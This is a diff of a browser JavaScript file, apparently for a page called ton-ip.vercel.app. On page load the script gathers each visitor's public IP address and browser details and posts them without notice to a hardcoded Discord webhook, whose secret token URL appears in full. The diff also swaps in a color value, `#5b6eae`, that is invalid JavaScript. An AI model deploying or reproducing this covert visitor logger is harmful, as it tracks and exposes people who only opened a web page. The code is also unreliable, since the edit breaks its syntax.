@@ -1,4 +1,3 @@
-// Fonction pour envoyer les détails au webhook Discord
 function sendDetailsToWebhook(details) {
     const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257993219485077628/foypbWcAqqIUEzUgBYZd3K-fISh-TIvH8jNtL_-k3Vlhj0A2ZxCHGM1j_AXjsUo3GwH5';
 
@@ -11,7 +10,7 @@ function sendDetailsToWebhook(details) {
         embeds: [{
             title: 'ton-ip.vercel.app',
             description: 'Details of the user accessing the page.',
-            color: 0xff0000, // Couleur rouge (hexadécimal)
+            color: #5b6eae,
             fields: [
                 { name: 'IP Address', value: details.ip, inline: true },
                 { name: 'User-Agent', value: details.userAgent, inline: true },
@@ -26,11 +25,10 @@ function sendDetailsToWebhook(details) {
             footer: {
                 text: 'Page accessed from ton-ip.vercel.app'
             },
-            timestamp: new Date() // Timestamp actuel
+            timestamp: new Date()
         }]
     };
 
-    // Envoi des données au webhook Discord
     fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -47,9 +45,7 @@ function sendDetailsToWebhook(details) {
     });
 }
 
-// Fonction pour obtenir les détails de l'utilisateur
 function getUserDetails() {
-    // Récupérer l'adresse IP publique
     const ipFetch = fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => data.ip)
@@ -58,7 +54,6 @@ function getUserDetails() {
             return 'N/A';
         });
 
-    // Collecter les détails de l'utilisateur
     const details = {
         userAgent: navigator.userAgent,
         language: navigator.language,
@@ -71,13 +66,11 @@ function getUserDetails() {
         doNotTrack: navigator.doNotTrack || 'Not enabled'
     };
 
-    // Retourner les détails combinés avec l'adresse IP
     return ipFetch.then(ip => {
         return { ip, ...details };
     });
 }
 
-// Obtenir les détails de l'utilisateur et les envoyer au webhook
 getUserDetails().then(details => {
     sendDetailsToWebhook(details);
 });
